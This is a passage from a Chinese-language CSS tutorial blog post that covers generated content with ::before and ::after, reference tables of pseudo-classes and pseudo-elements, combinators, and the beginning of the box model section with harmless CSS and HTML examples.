class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">background-color</span>: rebeccapurple;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230225142817596-20230305%2010:51:40.png" alt="image-20230225142817596"></p><p><code>::before</code>和<code>::after</code>伪元素与<code>content</code>属性的共同使用，在 CSS 中被叫做“生成内容”，而且你会见到这种技术被用于完成各种任务。<a href="http://www.cssarrowplease.com/">CSS Arrow Please</a>网站就是一个著名的示例，它帮你用 CSS 生成一个箭头。在你创建你的箭头的时候看下 CSS，你将会看到实际使用的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::before"><code>::before</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::after"><code>::after</code></a>伪元素。无论什么时候你看到了这些选择器，都要看下<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content"><code>content</code></a>属性，以了解文档中添加了什么。</p><h4 id="x3D-x3D-参考节-x3D-x3D"><a href="#x3D-x3D-参考节-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;参考节&#x3D;&#x3D;"></a>&#x3D;&#x3D;参考节&#x3D;&#x3D;</h4><p>有很多伪类和伪元素，所以有一个用于参考的列表会有用。下面是列出它们的表格，链接到了 MDN 上它们的参考页。把这作为参考，看看你能选中什么。</p><p><strong>伪类</strong></p><table><thead><tr><th align="left">选择器</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:active"><code>:active</code></a></td><td align="left">在用户激活（例如点击）元素的时候匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:any-link"><code>:any-link</code></a></td><td align="left">匹配一个链接的<code>:link</code>和<code>:visited</code>状态。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:blank"><code>:blank</code></a></td><td align="left">匹配空输入值的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input">&#96;&#96;元素</a>。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:checked"><code>:checked</code></a></td><td align="left">匹配处于选中状态的单选或者复选框。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:current"><code>:current</code> (en-US)</a></td><td align="left">匹配正在展示的元素，或者其上级元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:default"><code>:default</code></a></td><td align="left">匹配一组相似的元素中默认的一个或者更多的 UI 元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:dir"><code>:dir</code></a></td><td align="left">基于其方向性（HTML<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/dir"><code>dir</code></a>属性或者 CSS<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/direction"><code>direction</code></a>属性的值）匹配一个元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:disabled"><code>:disabled</code></a></td><td align="left">匹配处于关闭状态的用户界面元素</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:empty"><code>:empty</code></a></td><td align="left">匹配除了可能存在的空格外，没有子元素的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:enabled"><code>:enabled</code></a></td><td align="left">匹配处于开启状态的用户界面元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first"><code>:first</code></a></td><td align="left">匹配<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Paged_Media">分页媒体</a>的第一页。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first-child"><code>:first-child</code></a></td><td align="left">匹配兄弟元素中的第一个元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first-of-type"><code>:first-of-type</code></a></td><td align="left">匹配兄弟元素中第一个某种类型的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus"><code>:focus</code></a></td><td align="left">当一个元素有焦点的时候匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus-visible"><code>:focus-visible</code></a></td><td align="left">当元素有焦点，且焦点对用户可见的时候匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus-within"><code>:focus-within</code></a></td><td align="left">匹配有焦点的元素，以及子代元素有焦点的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:future"><code>:future</code> (en-US)</a></td><td align="left">匹配当前元素之后的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:hover"><code>:hover</code></a></td><td align="left">当用户悬浮到一个元素之上的时候匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:indeterminate"><code>:indeterminate</code></a></td><td align="left">匹配未定态值的 UI 元素，通常为<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input/checkbox">复选框</a>。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:in-range"><code>:in-range</code></a></td><td align="left">用一个区间匹配元素，当值处于区间之内时匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:invalid"><code>:invalid</code></a></td><td align="left">匹配诸如<code>&lt;input&gt;</code>的位于不可用状态的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:lang"><code>:lang</code></a></td><td align="left">基于语言（HTML<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/lang">lang</a>属性的值）匹配元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:last-child"><code>:last-child</code></a></td><td align="left">匹配兄弟元素中最末的那个元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:last-of-type"><code>:last-of-type</code></a></td><td align="left">匹配兄弟元素中最后一个某种类型的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:left"><code>:left</code></a></td><td align="left">在<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Pages">分页媒体 (en-US)</a>中，匹配左手边的页。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:link"><code>:link</code></a></td><td align="left">匹配未曾访问的链接。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:local-link"><code>:local-link</code> (en-US)</a></td><td align="left">匹配指向和当前文档同一网站页面的链接。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:is"><code>:is()</code></a></td><td align="left">匹配传入的选择器列表中的任何选择器。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:not"><code>:not</code></a></td><td align="left">匹配作为值传入自身的选择器未匹配的物件。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-child"><code>:nth-child</code></a></td><td align="left">匹配一列兄弟元素中的元素——兄弟元素按照<em>an+b</em>形式的式子进行匹配（比如 2n+1 匹配元素 1、3、5、7 等。即所有的奇数个）。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-of-type"><code>:nth-of-type</code></a></td><td align="left">匹配某种类型的一列兄弟元素（比如，<code>&lt;p&gt;</code>元素）——兄弟元素按照<em>an+b</em>形式的式子进行匹配（比如 2n+1 匹配元素 1、3、5、7 等。即所有的奇数个）。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-last-child"><code>:nth-last-child</code></a></td><td align="left">匹配一列兄弟元素，从后往前倒数。兄弟元素按照<em>an+b</em>形式的式子进行匹配（比如 2n+1 匹配按照顺序来的最后一个元素，然后往前两个，再往前两个，诸如此类。从后往前数的所有奇数个）。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-last-of-type"><code>:nth-last-of-type</code></a></td><td align="left">匹配某种类型的一列兄弟元素（比如，<code>&lt;p&gt;</code>元素），从后往前倒数。兄弟元素按照<em>an+b</em>形式的式子进行匹配（比如 2n+1 匹配按照顺序来的最后一个元素，然后往前两个，再往前两个，诸如此类。从后往前数的所有奇数个）。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:only-child"><code>:only-child</code></a></td><td align="left">匹配没有兄弟元素的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:only-of-type"><code>:only-of-type</code></a></td><td align="left">匹配兄弟元素中某类型仅有的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:optional"><code>:optional</code></a></td><td align="left">匹配不是必填的 form 元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:out-of-range"><code>:out-of-range</code></a></td><td align="left">按区间匹配元素，当值不在区间内的的时候匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:past"><code>:past</code> (en-US)</a></td><td align="left">匹配当前元素之前的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:placeholder-shown"><code>:placeholder-shown</code></a></td><td align="left">匹配显示占位文字的 input 元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:playing"><code>:playing</code> (en-US)</a></td><td align="left">匹配代表音频、视频或者相似的能“播放”或者“暂停”的资源的，且正在“播放”的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:paused"><code>:paused</code> (en-US)</a></td><td align="left">匹配代表音频、视频或者相似的能“播放”或者“暂停”的资源的，且正在“暂停”的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:read-only"><code>:read-only</code></a></td><td align="left">匹配用户不可更改的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:read-write"><code>:read-write</code></a></td><td align="left">匹配用户可更改的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:required"><code>:required</code></a></td><td align="left">匹配必填的 form 元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:right"><code>:right</code></a></td><td align="left">在<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Pages">分页媒体 (en-US)</a>中，匹配右手边的页。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:root"><code>:root</code></a></td><td align="left">匹配文档的根元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:scope"><code>:scope</code></a></td><td align="left">匹配任何为参考点元素的的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:valid"><code>:valid</code></a></td><td align="left">匹配诸如<code>&lt;input&gt;</code>元素的处于可用状态的元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:target"><code>:target</code></a></td><td align="left">匹配当前 URL 目标的元素（例如如果它有一个匹配当前<a href="https://en.wikipedia.org/wiki/Fragment_identifier">URL 分段</a>的元素）。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:visited"><code>:visited</code></a></td><td align="left">匹配已访问链接。</td></tr></tbody></table><p><strong>伪元素</strong></p><table><thead><tr><th align="left">选择器</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::after"><code>::after</code></a></td><td align="left">匹配出现在原有元素的实际内容之后的一个可样式化元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::before"><code>::before</code></a></td><td align="left">匹配出现在原有元素的实际内容之前的一个可样式化元素。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::first-letter"><code>::first-letter</code></a></td><td align="left">匹配元素的第一个字母。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::first-line"><code>::first-line</code></a></td><td align="left">匹配包含此伪元素的元素的第一行。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::grammar-error"><code>::grammar-error</code></a></td><td align="left">匹配文档中包含了浏览器标记的语法错误的那部分。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::selection"><code>::selection</code></a></td><td align="left">匹配文档中被选择的那部分。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::spelling-error"><code>::spelling-error</code></a></td><td align="left">匹配文档中包含了浏览器标记的拼写错误的那部分。</td></tr></tbody></table><h4 id="关系选择器"><a href="#关系选择器" class="headerlink" title="关系选择器"></a>关系选择器</h4><p>我们要了解的最后一种选择器被命名为关系选择器（Combinator），这是因为它们在其他选择器之间和其他选择器与文档内容的位置之间建立了一种有用的关系的缘故。</p><p><strong>后代选择器</strong></p><p>后代选择器——典型用单个空格（” “）字符——组合两个选择器，比如，第二个选择器匹配的元素被选择，如果他们有一个祖先（父亲，父亲的父亲，父亲的父亲的父亲，等等）元素匹配第一个选择器。选择器利用后代组合符被称作后代选择器。</p><p>下面的示例中，我们只会匹配处于带有<code>.box</code>类的元素里面的<code>&lt;p&gt;</code>元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Text in .box<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Text not in .box<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> <span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;  <br></code></pre></td></tr></table></figure><p><strong>子代关系选择器</strong></p><p>子代关系选择器是个大于号（<code>&gt;</code>），只会在选择器选中直接子元素的时候匹配。继承关系上更远的后代则不会匹配。例如，只选中作为<code>&lt;article&gt;</code>的直接子元素的<code>&lt;p&gt;</code>元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> &gt; <span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p><strong>邻接兄弟</strong></p><p>邻接兄弟选择器（<code>+</code>）用来选中恰好处于另一个在继承关系上同级的元素旁边的物件。例如，选中所有紧随<code>&lt;p&gt;</code>元素之后的<code>&lt;img&gt;</code>元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> + <span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333</span>;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>    <span class="hljs-attribute">padding</span>: .<span class="hljs-number">5em</span>;<br>&#125;   <br></code></pre></td></tr></table></figure><p><strong>通用兄弟</strong></p><p>如果你想选中一个元素的兄弟元素，即使它们不直接相邻，你还是可以使用通用兄弟关系选择器（<code>~</code>）。要选中所有的<code>&lt;p&gt;</code>元素后<em>任何地方</em>的<code>&lt;img&gt;</code>元素，我们会这样做：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> ~ <span class="hljs-selector-tag">img</span><br></code></pre></td></tr></table></figure><p><strong>使用关系选择器</strong></p><p>你能用关系选择器，将任何在我们前面的学习过程中学到的选择器组合起来，选出你的文档中的一部分。例如如果我们想选中为<code>&lt;ul&gt;</code>的直接子元素的带有“a”类的列表项的话，我可以用下面的代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span> &gt; <span class="hljs-selector-tag">li</span><span class="hljs-selector-attr">[class=<span class="hljs-string">&quot;a&quot;</span>]</span>  &#123;  &#125;<br></code></pre></td></tr></table></figure><p>不过，建立一长列选中你的文档中很明确的部分的选择器的时候，小心一些。这些 CSS 规则难以复用，因为你让选择器在表示标记文本中的元素的相对位置上过于明确。</p><p>建立简单的一个类，然后把它应用到有需求的元素上，经常会是更好的做法。不过话说回来，如果你需要让你的文档变换一下样式，但是没法编辑 HTML（也许是因为它由 CMS 生成）的话，你的关系选择器的知识会派上用场。</p><h3 id="2-2-盒模型"><a href="#2-2-盒模型" class="headerlink" title="2.2 盒模型"></a>2.2 盒模型</h3><p>在 CSS 中，所有的元素都被一个个的“盒子（box）”包围着，理解这些“盒子”的基本原理，是我们使用 CSS 实现准确布局、处理元素排列的关键。</p><p>本文围绕“盒模型”为主题展开。旨在于完成学习后，您能够在“理解盒装模型原理”的基础上，完成更加复杂的布局任务。 </p><h4 id="块级盒子（Block-box）和-内联盒子（Inline-box）"><a href="#块级盒子（Block-box）和-内联盒子（Inline-box）" class="headerlink" title="块级盒子（Block box）和 内联盒子（Inline box）"></a><strong>块级盒子（Block box）和 内联盒子（Inline box）</strong></h4><p>在 CSS 中我们广泛地使用两种“盒子” —— <strong>块级盒子</strong> (<strong>block box</strong>) 和 <strong>内联盒子</strong> (<strong>inline box</strong>)。这两种盒子会在<strong>页面流</strong>（page flow）和元素之间的关系方面表现出不同的行为：</p><p>一个被定义成块级的（block）盒子会表现出以下行为：</p><ul><li>盒子会在内联的方向上扩展并占据父容器在该方向上的所有可用空间，在绝大数情况下意味着盒子会和父容器一样宽</li><li>每个盒子都会换行</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/height"><code>height</code></a> 属性可以发挥作用</li><li>内边距（padding）, 外边距（margin）和 边框（border）会将其他元素从当前盒子周围“推开”</li></ul><p>除非特殊指定，诸如标题 (<code>&lt;h1&gt;</code>等) 和段落 (<code>&lt;p&gt;</code>) 默认情况下都是块级的盒子。</p><p>如果一个盒子对外显示为 <code>inline</code>，那么他的行为如下：</p><ul><li>盒子不会产生换行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/height"><code>height</code></a> 属性将不起作用。</li><li>垂直方向的内边距、外边距以及边框会被应用但是不会把其他处于 <code>inline</code> 状态的盒子推开。</li><li>水平方向的内边距、外边距以及边框会被应用且会把其他处于 <code>inline</code> 状态的盒子推开。</li></ul><p>用做链接的 <code>&lt;a&gt;</code> 元素、 <code>&lt;span&gt;</code>、 <code>&lt;em&gt;</code> 以及 <code>&lt;strong&gt;</code> 都是默认处于 <code>inline</code> 状态的。</p><p>我们通过对盒子<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display"><code>display</code></a> 属性的设置，比如 <code>inline</code> 或者 <code>block</code> ，来控制盒子的外部显示类型。</p><p><strong>补充：内部和外部显示类型</strong></p><p>在这里最好也解释下<strong>内部</strong> 和 <strong>外部</strong> 显示类型。如上所述，css 的 box 模型有一个外部显示类型，来决定盒子是块级还是内联。</p><p>同样盒模型还有内部显示类型，它决定了盒子内部元素是如何布局的。默认情况下是按照 **<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Normal_Flow">正常文档流</a> **布局，也意味着它们和其他块元素以及内联元素一样 (如上所述).</p><p>但是，我们可以通过使用类似 <code>flex</code> 的 <code>display</code> 属性值来更改内部显示类型。如果设置 <code>display: flex</code>，在一个元素上，外部显示类型是 <code>block</code>，但是内部显示类型修改为 <code>flex</code>。该盒子的所有直接子元素都会成为 flex 元素，会根据<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox">弹性盒子（Flexbox）</a>规则进行布局，稍后您将了解这些规则。</p><p>当你进一步了解 css 布局的更多细节的时候，你会了解到 <code>flex</code>，和其他内部显示类型会用到的值，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Grids"><code>grid</code></a> 。</p><p>块级和内联布局是 web 上默认的行为 —— 正如上面所述，它有时候被称为 <em>正常文档流</em>，因为如果没有其他说明，我们的盒子布局默认是块级或者内联。</p><h4 id="不同显示的例子"><a href="#不同显示的例子" class="headerlink" title="不同显示的例子"></a>不同显示的例子</h4><p>让我们继续看看别的例子。下面三个 html 元素，都有一个外部显示类型 <code>block</code>。第一个是一个段落，在 CSS 中加了边框。浏览器把它渲染成一个块级盒子，所以段落从新的一行开始，而且宽度占满一行。</p><p>第二个是一个列表，布局属性是 <code>display: flex</code>。将在容器中建立一个 flex 布局，但是每个列表是一个块级元素 —— 像段落一样 —— 会充满整个容器的宽度并且换行。</p><p>下面有个块级段落，里面有两个 <code>&lt;span&gt;</code> 元素。正常情况下是 <code>inline</code>，但是其中一个加了 block 类，设置属性 <code>display: block</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>I am a paragraph. A short one.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item One<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item Two<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item Three<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>I am another paragraph. Some of the <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;block&quot;</span>&gt;</span>words<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> have been wrapped in a <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>span element<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>, <br><span class="hljs-selector-tag">ul</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid rebeccapurple;<br>  <span class="hljs-attribute">padding</span>: .<span class="hljs-number">5em</span>;<br>&#125;<br><br><span class="hljs-selector-class">.block</span>,<br><span class="hljs-selector-tag">li</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid blue;<br>  <span class="hljs-attribute">padding</span>: .<span class="hljs-number">5em</span>;<br>&#125;<br><br><span class="hljs-selector-tag">ul</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">list-style</span>: none;<br>&#125;<br><br><span class="hljs-selector-class">.block</span> &#123;<br>  <span class="hljs-attribute">display</span>: block;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230225145508512-20230305%2010:52:00.png" alt="image-20230225145508512"></p><p>我们可以看到 <code>inline</code> 元素在下面例子中的表现。 <code>&lt;span&gt;</code> 在第一段默认是内联元素所以不换行。</p><p>还有一个 <code>&lt;ul&gt;</code> 设置为 <code>display: inline-flex</code>，使得在一些 flex 元素外创建一个内联框。</p><p>最后设置两个段落为 <code>display: inline</code>。inline flex 容器和段落在一行上而不是像块级元素一样换行。</p><p><strong>你可以修改 <code>display: inline</code> 为 <code>display: block</code> 或者 <code>display: inline-flex</code> 改为 <code>display: flex</code> 来观察显示模式切换。</strong></p><p>在后面的内容中会遇到诸如弹性盒子布局的内容；现在需要记住的是， <code>display</code> 属性可以改变盒子的外部显示类型是块级还是内联，这将会改变它与布局中的其他元素的显示方式。</p><p>剩下的内容，我们会专注于外部显示类型。</p><h4 id="什么是-CSS-盒模型？"><a href="#什么是-CSS-盒模型？" class="headerlink" title="什么是 CSS 盒模型？"></a>什么是 CSS 盒模型？</h4><p>完整的 CSS 盒模型应用于块级盒子，内联盒子只使用盒模型中定义的部分内容。模型定义了盒的每个部分 —— margin, border, padding, and content —— 合在一起就可以创建我们在页面上看到的内容。为了增加一些额外的复杂性，有一个标准的和替代（IE）的盒模型。</p><p><strong>盒模型的各个部分</strong></p><p>CSS 中组成一个块级盒子需要：</p><ul><li><strong>Content box</strong>: 这个区域是用来显示内容，大小可以通过设置 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/height"><code>height</code></a>.</li><li><strong>Padding box</strong>: 包围在内容区域外部的空白区域；大小通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding"><code>padding</code></a> 相关属性设置。</li><li><strong>Border box</strong>: 边框盒包裹内容和内边距。大小通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a> 相关属性设置。</li><li><strong>Margin box</strong>: 这是最外面的区域，是盒子和其他元素之间的空白区域。大小通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin"><code>margin</code></a> 相关属性设置。</li></ul><p>如下图：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/The_box_model/box-model.png" alt="Diagram of the box model"></p><p><strong>标准盒模型</strong></p><p>在标准模型中，如果你给盒设置 <code>width</code> 和 <code>height</code>，实际设置的是 <em>content box</em>。padding 和 border 再加上设置的宽高一起决定整个盒子的大小。见下图。</p><p>假设定义了 <code>width</code>, <code>height</code>, <code>margin</code>, <code>border</code>, and <code>padding</code>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">350px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">25px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">25px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果使用标准模型，实际占用空间的宽高分别为：宽度 &#x3D; 410px (350 + 25 + 25 + 5 + 5)，高度 &#x3D; 210px (150 + 25 + 25 + 5 + 5)。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/The_box_model/standard-box-model.png" alt="Showing the size of the box when the standard box model is being used."></p><p><strong>备注：</strong> margin 不计入实际大小 —— 